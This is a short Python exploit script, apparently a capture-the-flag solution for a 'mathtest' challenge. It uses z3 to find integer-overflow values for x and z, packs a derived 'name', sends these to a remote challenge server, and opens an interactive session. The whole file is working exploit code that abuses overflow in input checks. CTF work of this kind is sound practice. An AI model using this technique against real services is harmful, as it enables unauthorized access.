from pwn import *
from z3 import *
LOCAL = False

x = BitVec("x", 64)
y = -1
z = BitVec("z", 8)

solver = Solver()
solver.add(x >= 0, 0x9000*x < 0)
solver.add(ord('O')*z == ord('A'))

if solver.check() != sat:
    raise Exception("No solution found")

model = solver.model()
x = model[x].as_long()
z = model[z].as_long()

name = BitVec("name", 64)

solver = Solver()
solver.add(name == x + y + z)

if solver.check() != sat:
    raise Exception("No solution found")

model = solver.model()
name = model[name].as_long()

if LOCAL == True:
    p = process("./mathtest")
else:
    p = remote("18.207.140.246", 9001)

p.recvuntil(b"Enter Name:")
p.sendline(p64(name))

p.recvuntil(b"What is x\n")
p.sendline(str(x).encode())

p.recvuntil(b"What is y\n")
p.sendline(b"-1")

p.recvuntil(b"What is z?\n")
p.sendline(chr(z).encode())

p.interactive()
